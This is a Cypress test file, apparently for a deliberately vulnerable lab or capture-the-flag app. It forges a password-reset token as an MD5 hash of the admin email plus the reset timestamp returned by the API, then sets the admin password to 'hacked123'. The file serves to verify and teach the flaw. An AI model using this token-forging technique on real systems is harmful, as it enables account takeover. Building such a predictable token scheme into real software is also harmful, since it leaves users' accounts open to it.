describe("Insecure Password Reset", () => {
  const ADMIN_EMAIL = "admin@oss.com";

  it("exploits predictable token to reset admin password and retrieve the flag", () => {
    cy.visit("/login/forgot-password");

    cy.get("#email").type(ADMIN_EMAIL);
    cy.get("button[type=submit]").click();

    cy.contains("reset link has been sent").should("be.visible");

    cy.request("POST", "/api/auth/forgot-password", {
      email: ADMIN_EMAIL,
    }).then((response) => {
      expect(response.status).to.equal(200);
      const { requestedAt } = response.body;
      expect(requestedAt).to.be.a("string");

      const timestamp = Math.floor(new Date(requestedAt).getTime() / 1000);

      cy.task("hashMD5", ADMIN_EMAIL + timestamp).then((forgedToken) => {
        cy.visit(`/login/reset-password?token=${forgedToken}`);

        cy.get("#password").type("hacked123");
        cy.get("#confirmPassword").type("hacked123");
        cy.get("button[type=submit]").click();

        cy.contains("reset successfully").should("be.visible");
      });
    });
  });
});
